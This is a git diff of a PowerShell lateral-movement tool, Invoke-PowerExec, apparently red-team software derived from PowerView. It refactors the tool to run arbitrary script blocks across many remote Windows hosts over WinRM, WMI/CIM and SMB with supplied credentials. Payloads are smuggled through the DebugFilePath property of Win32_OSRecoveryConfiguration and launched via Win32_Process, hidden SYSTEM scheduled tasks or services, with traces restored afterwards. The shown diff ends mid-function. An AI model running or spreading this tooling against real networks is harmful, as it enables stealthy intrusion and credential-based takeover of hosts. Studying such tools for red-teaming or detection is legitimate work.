@@ -30,19 +30,20 @@ Function Invoke-PowerExec {
     Specifies the privileged account to use.
 
 .PARAMETER Authentication
-    Specifies what authentication method should be used.
+    Specifies what authentication method should be used, defaults to Negotiate.
 
 .PARAMETER Method
-    Specifies the execution method to use, defaults to CimProcess.
+    Specifies the execution method to use, defaults to WinRM.
 
 .PARAMETER Protocol
-    Specifies the transport protocol to use, defaults to DCOM.
+    Specifies the transport protocol to use, defaults to Wsman.
 
 .PARAMETER Timeout
     Specifies the duration to wait for a response from the target host (in seconds), defaults to 3.
 
 .PARAMETER Threads
-    Specifies the number of threads to use, defaults to 1.
+    Specifies the number of threads to use, defaults to 10.
+    This is only relevant for WinRM execution method, multi-threadeding is not supported for others.
 
 .EXAMPLE
     PS C:\> Invoke-PowerExec -ScriptBlock {Write-Output "$Env:COMPUTERNAME ($Env:USERDOMAIN\$Env:USERNAME)"} -ComputerList $(gc hosts.txt) -Method CimProcess
@@ -78,22 +79,22 @@ Function Invoke-PowerExec {
 
         [ValidateSet('Default', 'Kerberos', 'Negotiate', 'NtlmDomain')]
         [String]
-        $Authentication = 'Default',
+        $Authentication = 'Negotiate',
 
         [ValidateSet('CimProcess', 'CimTask', 'CimService', 'CimSubscription', 'SmbService', 'SmbTask', 'SmbDcom', 'WinRM')]
         [String]
-        $Method = 'CimProcess',
+        $Method = 'WinRM',
 
         [ValidateSet('Dcom', 'Wsman')]
         [String]
-        $Protocol = 'Dcom',
+        $Protocol = 'Wsman',
 
         [Int]
         $Timeout = 3,
 
         [ValidateNotNullOrEmpty()]
         [Int]
-        $Threads = 1
+        $Threads = 10
     )
 
     if ($PSBoundParameters.ContainsKey('Protocol') -and $Method -notmatch 'Cim.*') {
@@ -136,23 +137,20 @@ Function Invoke-PowerExec {
         }
     }
 
-    if ($Threads -eq 1 -or $hostList.Count -eq 1) {
-        foreach ($computer in $hostList) {
-            New-PowerExec -ScriptBlock $ScriptBlock -ComputerName $computer -Credential $Credential -Authentication $Authentication -Method $Method -Protocol $Protocol -Timeout $Timeout
+    $index = 0
+    $buffer = $Threads
+    do {
+        if (($index + $buffer) -lt $hostList.Count) {
+            $buffHostList = $hostList[$index..($index + $buffer-1)]
         }
-    }
-    else {
-        $parameters = @{
-            ScriptBlock = $ScriptBlock
-            Credential = $Credential
-            Authentication = $Authentication
-            Method = $Method
-            Protocol = $Protocol
-            Timeout = $Timeout
-            Verbose = $VerbosePreference
+        else {
+            $diff = ($hostList.Count - $index)
+            $buffHostList = $hostList[$index..($index + $diff-1)]
         }
-        New-ThreadedFunction -ScriptBlock ${function:New-PowerExec} -ScriptParameters $parameters -Collection $hostList -CollectionParameter 'ComputerName' -Threads $Threads
+        New-PowerExec -ScriptBlock $ScriptBlock -ComputerList $buffHostList -Credential $Credential -Authentication $Authentication -Method $Method -Protocol $Protocol -Timeout $Timeout -Threads $Threads
+        $index = $index + $buffer
     }
+    while ($index -lt $hostList.Count)
 }
 
 # Adapted from Find-Fruit by @rvrsh3ll
@@ -388,133 +386,6 @@ Function Local:Get-LdapObject {
     }
 }
 
-# Adapted from PowerView by @harmj0y and @mattifestation
-Function Local:New-ThreadedFunction {
-    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
-    [CmdletBinding()]
-    Param(
-        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
-        [String[]]
-        $Collection,
-
-        [ValidateNotNullOrEmpty()]
-        [String]
-        $CollectionParameter = 'ComputerName',
-
-        [Parameter(Mandatory = $True)]
-        [ScriptBlock]
-        $ScriptBlock,
-
-        [Hashtable]
-        $ScriptParameters,
-
-        [Int]
-        [ValidateRange(1,  100)]
-        $Threads = 10,
-
-        [Switch]
-        $NoImports
-    )
-
-    Begin {
-        $SessionState = [Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
-
-        # Force a single-threaded apartment state (for token-impersonation stuffz)
-        $SessionState.ApartmentState = [Threading.ApartmentState]::STA
-
-        # Import the current session state's variables and functions so the chained functionality can be used by the threaded blocks
-        if (-not $NoImports) {
-            # Grab all the current variables for this runspace
-            $MyVars = Get-Variable -Scope 2
-
-            # These variables are added by Runspace.Open() method and produce Stop errors if added twice
-            $VorbiddenVars = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')
-
-            # Add variables from Parent Scope (current runspace) into the InitialSessionState
-            foreach ($Var in $MyVars) {
-                if ($VorbiddenVars -NotContains $Var.Name) {
-                    $SessionState.Variables.Add((New-Object -TypeName Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
-                }
-            }
-
-            # Add functions from current runspace to the InitialSessionState
-            foreach ($Function in (Get-ChildItem Function:)) {
-                $SessionState.Commands.Add((New-Object -TypeName Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
-            }
-        }
-
-        # Create a pool of $Threads runspaces
-        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
-        $Pool.Open()
-
-        # Get the proper BeginInvoke() method that allows for an output queue
-        $Method = $null
-        foreach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
-            $MethodParameters = $M.GetParameters()
-            if (($MethodParameters.Count -eq 2) -and $MethodParameters[0].Name -eq 'input' -and $MethodParameters[1].Name -eq 'output') {
-                $Method = $M.MakeGenericMethod([Object], [Object])
-                break
-            }
-        }
-
-        $Jobs = @()
-        $Collection = $Collection | Where-Object {$_ -and $_.Trim()}
-        Write-Verbose "[THREAD] Processing $($Collection.Count) elements with $Threads threads."
-
-        foreach ($Element in $Collection) {
-            # Create a "powershell pipeline runner"
-            $PowerShell = [PowerShell]::Create()
-            $PowerShell.runspacepool = $Pool
-
-            # Add the script block and arguments
-            $null = $PowerShell.AddScript($ScriptBlock).AddParameter($CollectionParameter, $Element)
-            if ($ScriptParameters) {
-                foreach ($Param in $ScriptParameters.GetEnumerator()) {
-                    $null = $PowerShell.AddParameter($Param.Name, $Param.Value)
-                }
-            }
-
-            # Create the output queue
-            $Output = New-Object Management.Automation.PSDataCollection[Object]
-
-            # Start job
-            $Jobs += @{
-                PS = $PowerShell
-                Output = $Output
-                Result = $Method.Invoke($PowerShell, @($null, [Management.Automation.PSDataCollection[Object]]$Output))
-            }
-        }
-    }
-
-    End {
-        Write-Verbose "[THREAD] Executing threads"
-
-        # Continuously loop through each job queue, consuming output as appropriate
-        do {
-            foreach ($Job in $Jobs) {
-                $Job.Output.ReadAll()
-            }
-            Start-Sleep -Seconds 1
-        }
-        while (($Jobs | Where-Object {-not $_.Result.IsCompleted}).Count -gt 0)
-
-        $SleepSeconds = 100
-        Write-Verbose "[THREAD] Waiting $SleepSeconds seconds for final cleanup..."
-
-        # Cleanup
-        for ($i=0; $i -lt $SleepSeconds; $i++) {
-            foreach ($Job in $Jobs) {
-                $Job.Output.ReadAll()
-                $Job.PS.Dispose()
-            }
-            Start-Sleep -Seconds 1
-        }
-
-        $Pool.Dispose()
-        Write-Verbose "[THREAD] All threads completed"
-    }
-}
-
 Function Local:New-PowerExec {
     Param (
         [Parameter(Mandatory = $True)]
@@ -523,8 +394,8 @@ Function Local:New-PowerExec {
 
         [Parameter(Mandatory = $True)]
         [ValidateNotNullOrEmpty()]
-        [string]
-        $ComputerName,
+        [string[]]
+        $ComputerList,
 
         [ValidateNotNullOrEmpty()]
         [Management.Automation.PSCredential]
@@ -543,146 +414,154 @@ Function Local:New-PowerExec {
         $Protocol = 'Dcom',
 
         [Int]
-        $Timeout = 3
+        $Timeout = 3,
+
+        [Int]
+        [ValidateRange(1, 100)]
+        $Threads = 10
     )
 
     $output = $null
     switch ($Method) {
         'WinRM' {
-            try {
-                $psOption = New-PSSessionOption -NoMachineProfile -OperationTimeout $($Timeout*1000)
-                $output = Invoke-Command -ScriptBlock $ScriptBlock -ComputerName $ComputerName -Credential $Credential -Authentication $Authentication -SessionOption $psOption -ErrorAction Stop
+            $psOption = New-PSSessionOption -NoMachineProfile -OperationTimeout $($Timeout*1000)
+            if ($Credential.Username) {
+                $psSessions = New-PSSession -ComputerName $ComputerList -Credential $Credential -Authentication $Authentication -SessionOption $psOption -ErrorAction SilentlyContinue
             }
-            catch [Management.Automation.RuntimeException] {
-                if($Error[0].FullyQualifiedErrorId -eq 'ComputerNotFound,PSSessionStateBroken') {
-                    Write-Verbose "[$ComputerName] DNS resolution failed."
+            else {
+                $psSessions = New-PSSession -ComputerName $ComputerList -Authentication $Authentication -SessionOption $psOption -ErrorAction SilentlyContinue
+            }
+            if ($psSessions) {
+                $job = Invoke-Command -Session $psSessions -ScriptBlock $ScriptBlock -AsJob -ThrottleLimit $Threads
+                $job | Wait-Job -Timeout 900 | Out-Null # Each set of jobs has a 10 minute timeout to prevent endless stalling
+                if ($job.State -contains "Running") {
+                    Write-Warning "Job timeout exceeded, continuing..."
                 }
-                elseif($Error[0].FullyQualifiedErrorId -eq 'WinRMOperationTimeout,PSSessionStateBroken') {
-                    Write-Verbose "[$ComputerName] Host is unreachable."
+                $job.ChildJobs | Foreach-Object {
+                    $childJob = $_
+                    Write-Host "`n[$($childJob.Location)] Execution finished."
+                    Receive-Job -Job $childJob
                 }
-                elseif($Error[0].FullyQualifiedErrorId -eq 'CannotConnect,PSSessionStateBroken') {
-                    Write-Verbose "[$ComputerName] WinRM server is unavailable."
-                }
-                elseif($Error[0].FullyQualifiedErrorId -eq 'AccessDenied,PSSessionStateBroken') {
-                    Write-Verbose "[$ComputerName] Access is denied."
-                }
-                else {
-                    Write-Warning "[$ComputerName] Execution failed. $_"
-                }
+                Remove-Job $job
+                Remove-PSSession $psSessions
             }
         }
         'CimProcess' {
-            try {
-                $output = Invoke-CimProcess -ScriptBlock $ScriptBlock -ComputerName $ComputerName -Credential $Credential -Authentication $Authentication -Protocol $Protocol -Timeout $Timeout -Verbose:$false
+            $cimOption = New-CimSessionOption -Protocol $Protocol
+            if ($Credential.Username) {
+                $cimSessions = New-CimSession -ComputerName $ComputerList -Credential $Credential -Authentication $Authentication -SessionOption $cimOption -OperationTimeoutSec $Timeout -Verbose:$false -ErrorAction SilentlyContinue #-ErrorAction Stop
             }
-            catch [Microsoft.Management.Infrastructure.CimException] {
-                if($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x800706ba,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
-                    Write-Verbose "[$ComputerName] Host is unreachable."
+            else {
+                $cimSessions = New-CimSession -ComputerName $ComputerList -Authentication $Authentication -SessionOption $cimOption -OperationTimeoutSec $Timeout -Verbose:$false -ErrorAction SilentlyContinue #-ErrorAction Stop
+            }
+            if ($cimSessions) {
+                $parameters = @{
+                    ScriptBlock = $ScriptBlock
+                    Verbose = $VerbosePreference
                 }
-                elseif($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x8007052e,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
-                    Write-Verbose "[$ComputerName] Access is denied."
-                }
-                elseif($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x80070005,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
-                    Write-Verbose "[$ComputerName] Access is denied."
-                }
-                else {
-                    Write-Warning "[$ComputerName] Execution failed. $_"
-                }
+                Invoke-CimProcess @parameters -CimSession $cimSessions
+                Remove-CimSession -CimSession $cimSessions
             }
         }
         'CimTask' {
-            try {
-                $output = Invoke-CimTask -ScriptBlock $ScriptBlock -ComputerName $ComputerName -Credential $Credential -Authentication $Authentication -Protocol $Protocol -Timeout $Timeout -Verbose:$false
+            $cimOption = New-CimSessionOption -Protocol $Protocol
+            if ($Credential.Username) {
+                $cimSessions = New-CimSession -ComputerName $ComputerList -Credential $Credential -Authentication $Authentication -SessionOption $cimOption -OperationTimeoutSec $Timeout -Verbose:$false -ErrorAction SilentlyContinue #-ErrorAction Stop
             }
-            catch [Microsoft.Management.Infrastructure.CimException] {
-                if($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x800706ba,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
-                    Write-Verbose "[$ComputerName] Host is unreachable."
+            else {
+                $cimSessions = New-CimSession -ComputerName $ComputerList -Authentication $Authentication -SessionOption $cimOption -OperationTimeoutSec $Timeout -Verbose:$false -ErrorAction SilentlyContinue #-ErrorAction Stop
+            }
+            if ($cimSessions) {
+                $parameters = @{
+                    ScriptBlock = $ScriptBlock
+                    Verbose = $VerbosePreference
                 }
-                elseif($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x8007052e,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
-                    Write-Verbose "[$ComputerName] Access is denied."
-                }
-                elseif($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x80070005,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
-                    Write-Verbose "[$ComputerName] Access is denied."
-                }
-                else {
-                    Write-Warning "[$ComputerName] Execution failed. $_"
-                }
+                Invoke-CimTask @parameters -CimSession $cimSessions
+                Remove-CimSession -CimSession $cimSessions
             }
         }
         'CimService' {
-            try {
-                $output = Invoke-CimService -ScriptBlock $ScriptBlock -ComputerName $ComputerName -Credential $Credential -Authentication $Authentication -Protocol $Protocol -Timeout $Timeout -Verbose:$false
+            $cimOption = New-CimSessionOption -Protocol $Protocol
+            if ($Credential.Username) {
+                $cimSessions = New-CimSession -ComputerName $ComputerList -Credential $Credential -Authentication $Authentication -SessionOption $cimOption -OperationTimeoutSec $Timeout -Verbose:$false -ErrorAction SilentlyContinue #-ErrorAction Stop
             }
-            catch [Microsoft.Management.Infrastructure.CimException] {
-                if($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x800706ba,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
-                    Write-Verbose "[$ComputerName] Host is unreachable."
+            else {
+                $cimSessions = New-CimSession -ComputerName $ComputerList -Authentication $Authentication -SessionOption $cimOption -OperationTimeoutSec $Timeout -Verbose:$false -ErrorAction SilentlyContinue #-ErrorAction Stop
+            }
+            if ($cimSessions) {
+                $parameters = @{
+                    ScriptBlock = $ScriptBlock
+                    Verbose = $VerbosePreference
                 }
-                elseif($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x8007052e,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
-                    Write-Verbose "[$ComputerName] Access is denied."
-                }
-                elseif($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x80070005,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
-                    Write-Verbose "[$ComputerName] Access is denied."
-                }
-                else {
-                    Write-Warning "[$ComputerName] Execution failed. $_"
-                }
+                Invoke-CimService @parameters -CimSession $cimSessions
+                Remove-CimSession -CimSession $cimSessions
             }
         }
         'CimSubscription' {
-            try {
-                $output = Invoke-CimSubscription -ScriptBlock $ScriptBlock -ComputerName $ComputerName -Credential $Credential -Authentication $Authentication -Protocol $Protocol -Timeout $Timeout -Verbose:$false
+            $cimOption = New-CimSessionOption -Protocol $Protocol
+            if ($Credential.Username) {
+                $cimSessions = New-CimSession -ComputerName $ComputerList -Credential $Credential -Authentication $Authentication -SessionOption $cimOption -OperationTimeoutSec $Timeout -Verbose:$false -ErrorAction SilentlyContinue #-ErrorAction Stop
             }
-            catch [Microsoft.Management.Infrastructure.CimException] {
-                if($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x800706ba,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
-                    Write-Verbose "[$ComputerName] Host is unreachable."
+            else {
+                $cimSessions = New-CimSession -ComputerName $ComputerList -Authentication $Authentication -SessionOption $cimOption -OperationTimeoutSec $Timeout -Verbose:$false -ErrorAction SilentlyContinue #-ErrorAction Stop
+            }
+            if ($cimSessions) {
+                $parameters = @{
+                    ScriptBlock = $ScriptBlock
+                    Verbose = $VerbosePreference
                 }
-                elseif($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x8007052e,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
-                    Write-Verbose "[$ComputerName] Access is denied."
-                }
-                elseif($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x80070005,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
-                    Write-Verbose "[$ComputerName] Access is denied."
-                }
-                else {
-                    Write-Warning "[$ComputerName] Execution failed. $_"
-                }
+                Invoke-CimSubscription @parameters -CimSession $cimSessions
+                Remove-CimSession -CimSession $cimSessions
             }
         }
         'SmbService' {
-            try {
-                $output = Invoke-SmbService -ScriptBlock $ScriptBlock -ComputerName $ComputerName -Credential $Credential -Verbose:$false
+            $parameters = @{
+                ScriptBlock = $ScriptBlock
+                Credential = $Credential
+                Verbose = $VerbosePreference
             }
-            catch [Management.Automation.RuntimeException] {
-                if ($Error[0].FullyQualifiedErrorId -eq '5') {
-                    Write-Verbose "[$ComputerName] Access is denied."
+            foreach ($computer in $ComputerList) {
+                try {
+                    Invoke-SmbService @parameters -ComputerName $computer
                 }
-                elseif ($Error[0].FullyQualifiedErrorId -eq '1722') {
-                    Write-Verbose "[$ComputerName] Host is unreachable."
-                }
-                else {
-                    Write-Warning "[$ComputerName] Execution failed. $_"
+                catch {
+                    Write-Verbose "[$computer] Execution failed. $_"
+                    continue
                 }
             }
         }
         'SmbTask' {
-            try {
-                $output = Invoke-SmbTask -ScriptBlock $ScriptBlock -ComputerName $ComputerName -Credential $Credential -Verbose:$false
+            $parameters = @{
+                ScriptBlock = $ScriptBlock
+                Credential = $Credential
+                Verbose = $VerbosePreference
             }
-            catch {
-                Write-Warning "[$ComputerName] Execution failed. $_"
+            foreach ($computer in $ComputerList) {
+                try {
+                    Invoke-SmbTask @parameters -ComputerName $computer
+                }
+                catch {
+                    Write-Verbose "[$computer] Execution failed. $_"
+                    continue
+                }
             }
         }
         'SmbDcom' {
-            try {
-                $output = Invoke-SmbDcom -ScriptBlock $ScriptBlock -ComputerName $ComputerName -Credential $Credential -Verbose:$false
+            $parameters = @{
+                ScriptBlock = $ScriptBlock
+                Credential = $Credential
+                Verbose = $VerbosePreference
             }
-            catch {
-                Write-Warning "[$ComputerName] Execution failed. $_"
+            foreach ($computer in $ComputerList) {
+                try {
+                    Invoke-SmbDcom @parameters -ComputerName $computer
+                }
+                catch {
+                    Write-Verbose "[$computer] Execution failed. $_"
+                    continue
+                }
             }
         }
-    }
-    if ($output) {
-        Write-Host "[$ComputerName] Successful execution"
-        Write-Output $output
     }
 }
 
@@ -696,15 +575,15 @@ Function Local:Invoke-CimDelivery {
         [ScriptBlock]
         $ScriptBlock
     )
-
     Begin {
-        Write-Verbose "[CIMDELIVERY] Getting CIM object"
+        $computerName = $CimSession.ComputerName
+        Write-Verbose "[$computerName] Getting CIM object..."
         $cimObject = Get-CimInstance -Class Win32_OSRecoveryConfiguration -CimSession $CimSession -ErrorAction Stop -Verbose:$false
         $obj = New-Object -TypeName psobject
         $obj | Add-Member -MemberType NoteProperty -Name 'OriginalValue' -Value $cimObject.DebugFilePath
     }
     Process {
-        Write-Verbose "[CIMDELIVERY] Encoding payload into CIM property DebugFilePath"
+        Write-Verbose "[$computerName] Encoding payload into CIM property DebugFilePath..."
         $script = ''
         $script += '[ScriptBlock]$scriptBlock = {' + $ScriptBlock.Ast.Extent.Text + '}' + [Environment]::NewLine -replace '{{','{' -replace '}}','}'
         $script += '$output = [Management.Automation.PSSerializer]::Serialize((& $scriptBlock *>&1))' + [Environment]::NewLine
@@ -738,15 +617,14 @@ Function Local:Invoke-CimRecovery {
         [String]
         $DefaultValue = '%SystemRoot%\MEMORY.DMP'
     )
-
     Begin {
-        Write-Verbose "[CIMRECOVERY] Getting CIM object"
-        $cimObject = Get-CimInstance -ClassName Win32_OSRecoveryConfiguration -CimSession $cimSession -Verbose:$false -ErrorAction Stop
         $computerName = $CimSession.ComputerName
+        Write-Verbose "[$computerName] Getting CIM object..."
+        $cimObject = Get-CimInstance -ClassName Win32_OSRecoveryConfiguration -CimSession $cimSession -Verbose:$false -ErrorAction Stop
     }
     Process {
         try {
-            Write-Verbose "[CIMRECOVERY] Decoding data from property DebugFilePath"
+            Write-Verbose "[$computerName] Decoding data from property DebugFilePath..."
             $serializedOutput = [char[]][int[]]$cimObject.DebugFilePath.Split(',') -Join ''
             $output = ([Management.Automation.PSSerializer]::Deserialize($serializedOutput))
         }
@@ -754,7 +632,7 @@ Function Local:Invoke-CimRecovery {
             Write-Warning "[$computerName] Failed to decode data."
         }
         finally {
-            Write-Verbose "[CIMRECOVERY] Restoring original value: $DefaultValue"
+            Write-Verbose "[$computerName] Restoring original value: $DefaultValue"
             $cimObject.DebugFilePath = $DefaultValue
             $cimObject | Set-CimInstance -Verbose:$false
         }
@@ -771,57 +649,35 @@ Function Local:Invoke-CimProcess {
         [ScriptBlock]
         $ScriptBlock,
 
-        [ValidateNotNullOrEmpty()]
-        [String]
-        $ComputerName = $env:COMPUTERNAME,
-
-        [ValidateNotNullOrEmpty()]
-        [Management.Automation.PSCredential]
-        [Management.Automation.Credential()]
-        $Credential = [Management.Automation.PSCredential]::Empty,
-
-        [String]
-        $Authentication = 'Default',
-
-        [ValidateSet('Dcom', 'Wsman')]
-        [String]
-        $Protocol = 'Dcom',
-
-        [Int]
-        $Timeout = 3
+        [Parameter(Mandatory = $True)]
+        [CimSession[]]
+        $CimSession
     )
-
-    Begin {
+    foreach ($session in $cimSession) {
+        $computerName = $session.ComputerName
         try {
-            $cimOption = New-CimSessionOption -Protocol $Protocol
-            if ($Credential.Username) {
-                $cimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential -Authentication $Authentication -SessionOption $cimOption -OperationTimeoutSec $Timeout -ErrorAction Stop -Verbose:$false
-            }
-            else {
-                $cimSession = New-CimSession -ComputerName $ComputerName -Authentication $Authentication -SessionOption $cimOption -OperationTimeoutSec $Timeout -ErrorAction Stop -Verbose:$false
-            }
+            $delivery = Invoke-CimDelivery -CimSession $session -ScriptBlock $ScriptBlock
+            $command = 'powershell -NoP -NonI -C "' + $delivery.Loader + '"'
         }
         catch {
-            throw $_
+            Write-Verbose "[$computerName] Delivery failed. $_"
+            continue
         }
-        $delivery = Invoke-CimDelivery -CimSession $cimSession -ScriptBlock $ScriptBlock
-        $command = 'powershell -NoP -NonI -C "' + $delivery.Loader + '"'
-    }
-    Process {
         try {
-            Write-Verbose "[CIMEXEC] Running command: $command"    
-            $process = Invoke-CimMethod -ClassName Win32_Process -Name Create -Arguments @{CommandLine=$command} -CimSession $cimSession -Verbose:$false
-            while ((Get-CimInstance -ClassName Win32_Process -Filter "ProcessId='$($process.ProcessId)'" -CimSession $cimSession -Verbose:$false).ProcessID) {
+            Write-Verbose "[$computerName] Running command..."
+            Write-Debug "$command"
+            $process = Invoke-CimMethod -ClassName Win32_Process -Name Create -Arguments @{CommandLine=$command} -CimSession $session -Verbose:$false
+            while ((Get-CimInstance -ClassName Win32_Process -Filter "ProcessId='$($process.ProcessId)'" -CimSession $session -Verbose:$false).ProcessID) {
                 Start-Sleep -Seconds 1
             }
         }
-        catch [Microsoft.Management.Infrastructure.CimException] {
-            Write-Warning "[$ComputerName] Execution failed. $_"
+        catch {
+            Write-Warning "[$computerName] Execution failed. $_"
         }
-    }
-    End {
-        Invoke-CimRecovery -CimSession $cimSession -DefaultValue $delivery.OriginalValue
-        Remove-CimSession -CimSession $cimSession
+        finally {
+            Write-Host "`n[$computerName] Execution finished."
+            Invoke-CimRecovery -CimSession $session -DefaultValue $delivery.OriginalValue
+        }
     }
 }
 
@@ -832,64 +688,44 @@ Function Local:Invoke-CimTask {
         [ScriptBlock]
         $ScriptBlock,
 
-        [ValidateNotNullOrEmpty()]
-        [String]
-        $ComputerName = $env:COMPUTERNAME,
+        [Parameter(Mandatory = $True)]
+        [CimSession[]]
+        $CimSession,
 
         [ValidateNotNullOrEmpty()]
-        [Management.Automation.PSCredential]
-        [Management.Automation.Credential()]
-        $Credential = [Management.Automation.PSCredential]::Empty,
-
         [String]
-        $Authentication = 'Default',
-
-        [ValidateSet('Dcom', 'Wsman')]
-        [String]
-        $Protocol = 'Dcom',
-
-        [Int]
-        $Timeout = 3
+        $TaskName = [guid]::NewGuid().Guid
     )
-
-    Begin {
+    foreach ($session in $cimSession) {
+        $computerName = $session.ComputerName
         try {
-            $cimOption = New-CimSessionOption -Protocol $Protocol
-            if ($Credential.Username) {
-                $cimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential -Authentication $Authentication -SessionOption $cimOption -OperationTimeoutSec $Timeout -ErrorAction Stop -Verbose:$false
-            }
-            else {
-                $cimSession = New-CimSession -ComputerName $ComputerName -Authentication $Authentication -SessionOption $cimOption -OperationTimeoutSec $Timeout -ErrorAction Stop -Verbose:$false
-            }
+            $delivery = Invoke-CimDelivery -CimSession $session -ScriptBlock $ScriptBlock
+            $argument = '-NoP -NonI -C "' + $delivery.Loader + '"'
         }
         catch {
-            throw $_
+            Write-Verbose "[$computerName] Delivery failed. $_"
+            continue
         }
-        $delivery = Invoke-CimDelivery -CimSession $cimSession -ScriptBlock $ScriptBlock
-        $argument = '-NoP -NonI -C "' + $delivery.Loader + '"'
-    }
-    Process {
-        try  {
+        try {
             $taskParameters = @{
-                TaskName = [guid]::NewGuid().Guid
+                TaskName = $TaskName
                 Action = New-ScheduledTaskAction -WorkingDirectory "%windir%\System32\WindowsPowerShell\v1.0\" -Execute "powershell" -Argument $argument
                 Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
-                Principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest -CimSession $cimSession
+                Principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest -CimSession $session
             }
-            Write-Verbose "[CIMEXEC] Registering scheduled task $($taskParameters.TaskName)"
-            $scheduledTask = Register-ScheduledTask @taskParameters -CimSession $cimSession -ErrorAction Stop
-            Write-Verbose "[CIMEXEC] Running command: powershell $argument"
+            Write-Verbose "[$computerName] Registering scheduled task $TaskName..."
+            $scheduledTask = Register-ScheduledTask @taskParameters -CimSession $session -ErrorAction Stop
+            Write-Verbose "[$computerName] Running command..."
+            Write-Debug "powershell $argument"
             $cimJob = $scheduledTask | Start-ScheduledTask -AsJob -ErrorAction Stop
             $cimJob | Wait-Job | Remove-Job -Force -Confirm:$False
             while (($scheduledTaskInfo = $scheduledTask | Get-ScheduledTaskInfo).LastTaskResult -eq 267009) {
                 Start-Sleep -Seconds 1
             }
-
             if ($scheduledTaskInfo.LastRunTime.Year -ne (Get-Date).Year) { 
                 Write-Warning "[$ComputerName] Failed to execute scheduled task."
             }
-
-            Write-Verbose "[CIMEXEC] Unregistering scheduled task $($taskParameters.TaskName)"
+            Write-Verbose "[$computerName] Unregistering scheduled task $TaskName..."
             if ($Protocol -eq 'Wsman') {
                 $scheduledTask | Get-ScheduledTask -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$False | Out-Null
             }
@@ -897,16 +733,13 @@ Function Local:Invoke-CimTask {
                 $scheduledTask | Get-ScheduledTask -ErrorAction SilentlyContinue | Unregister-ScheduledTask | Out-Null
             }
         }
-        catch [Management.Automation.ActionPreferenceStopException] {
-            Write-Warning "[$ComputerName] Insufficient rights. $_"
-        }
         catch {
-            Write-Warning "[$ComputerName] Execution failed. $_"
+            Write-Warning "[$computerName] Execution failed. $_"
         }
-    }
-    End {
-        Invoke-CimRecovery -CimSession $cimSession -DefaultValue $delivery.OriginalValue
-        Remove-CimSession -CimSession $cimSession
+        finally {
+            Write-Host "`n[$computerName] Execution finished."
+            Invoke-CimRecovery -CimSession $session -DefaultValue $delivery.OriginalValue
+        }
     }
 }
 
@@ -917,81 +750,62 @@ Function Local:Invoke-CimService {
         [ScriptBlock]
         $ScriptBlock,
 
-        [ValidateNotNullOrEmpty()]
-        [String]
-        $ComputerName = $env:COMPUTERNAME,
+        [Parameter(Mandatory = $True)]
+        [CimSession[]]
+        $CimSession,
 
         [ValidateNotNullOrEmpty()]
-        [Management.Automation.PSCredential]
-        [Management.Automation.Credential()]
-        $Credential = [Management.Automation.PSCredential]::Empty,
-
         [String]
-        $Authentication = 'Default',
-
-        [ValidateSet('Dcom', 'Wsman')]
-        [String]
-        $Protocol = 'Dcom',
-
-        [Int]
-        $Timeout = 3
+        $ServiceName = [guid]::NewGuid().Guid
     )
-
-    Begin {
+    foreach ($session in $cimSession) {
+        $computerName = $session.ComputerName
         try {
-            $cimOption = New-CimSessionOption -Protocol $Protocol
-            if ($Credential.Username) {
-                $cimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential -Authentication $Authentication -SessionOption $cimOption -OperationTimeoutSec $Timeout -ErrorAction Stop -Verbose:$false
-            }
-            else {
-                $cimSession = New-CimSession -ComputerName $ComputerName -Authentication $Authentication -SessionOption $cimOption -OperationTimeoutSec $Timeout -ErrorAction Stop -Verbose:$false
-            }
+            $delivery = Invoke-CimDelivery -CimSession $session -ScriptBlock $ScriptBlock
+            $command = '%COMSPEC% /c powershell -NoP -NonI -C "' + $delivery.Loader + '"'
         }
         catch {
-            throw $_
+            Write-Verbose "[$computerName] Delivery failed. $_"
+            continue
